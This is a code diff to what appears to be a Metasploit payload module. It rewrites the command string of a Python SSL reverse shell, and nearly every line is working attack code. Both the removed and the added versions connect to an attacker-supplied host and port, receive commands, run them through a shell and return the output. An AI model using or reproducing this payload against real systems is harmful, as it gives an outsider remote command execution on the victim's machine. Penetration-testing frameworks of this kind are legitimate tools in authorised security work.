@@ -42,22 +42,16 @@ module MetasploitModule
   # Returns the command string to use for execution
   #
   def command_string
-    cmd = <<~PYTHON
-      import socket as s
-      import subprocess as r
-      import ssl
-      so=s.socket(s.AF_INET,s.SOCK_STREAM)
-      so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))
-      so=ssl.wrap_socket(so)
-      while True:
-      	d=so.recv(1024)
-      	if len(d)==0:
-      		break
-      	p=r.Popen(d.decode('utf-8'),shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)
-      	o=p.stdout.read()+p.stderr.read()
-      	so.sendall(o)
-    PYTHON
-
+    cmd  = "import socket as s,subprocess as r\n"
+    cmd += "so=s.socket(2,1)\n"
+    cmd += "so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))\n"
+    cmd += py_ssl_wrap_socket('so')
+    cmd += "while True:\n"
+    cmd += "\td=so.recv(1024)\n"
+    cmd += "\tif len(d)==0:\n\t\tbreak\n"
+    cmd += "\tp=r.Popen(d.decode('utf-8'),shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)\n"
+    cmd += "\to=p.stdout.read()+p.stderr.read()\n"
+    cmd += "\tso.sendall(o)\n"
     py_create_exec_stub(cmd)
   end
 end
